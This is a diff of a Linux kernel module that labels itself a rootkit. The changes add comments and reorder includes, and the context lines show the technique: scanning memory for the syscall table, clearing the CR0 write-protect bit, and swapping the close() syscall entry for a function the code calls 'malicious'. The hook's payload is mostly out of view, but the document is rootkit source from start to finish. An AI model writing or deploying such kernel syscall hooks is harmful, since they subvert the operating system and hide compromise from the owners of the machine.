@@ -1,8 +1,8 @@
+#include <asm/unistd.h>
+#include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
-#include <linux/init.h>
 #include <linux/syscalls.h>
-#include <asm/unistd.h>
 
 #if defined(__x86_64__)
 #define SYSCALL_TABLE_START ((unsigned long) 0xffffffff81000000l)
@@ -16,8 +16,10 @@ typedef unsigned int pointer_size_t;
 unsigned int **syscall_table;
 #endif
 
+/* To store a pointer to original close() */
 asmlinkage int (*original_close)(int fd);
 
+/* Malicious close() syscall */
 asmlinkage int my_close(int fd)
 {
     int err;
@@ -26,6 +28,7 @@ asmlinkage int my_close(int fd)
     return err;
 }
 
+/* Locate the syscall table in memory */
 pointer_size_t **find_syscall_table(void)
 {
     pointer_size_t i;
@@ -38,6 +41,8 @@ pointer_size_t **find_syscall_table(void)
     return NULL;
 }
 
+
+/* Loads the rootkit */
 int rootkit_init(void)
 {
     printk("RKIT: Loading rootkit...\n");
@@ -65,7 +70,7 @@ int rootkit_init(void)
     // make writable by disabling write protect
     write_cr0(read_cr0() & (~0x10000));
 
-    // hijack chdir system call
+    // hijack close system call
     original_close = (asmlinkage int (*)(int)) syscall_table[__NR_close];
     syscall_table[__NR_close] = (void *) my_close;
     printk("RKIT: Calls hijacked\n");
@@ -78,6 +83,7 @@ out:
     return 0;
 }
 
+/* Unloads the rootkit */
 void rootkit_exit(void)
 {
     if (syscall_table == NULL) {
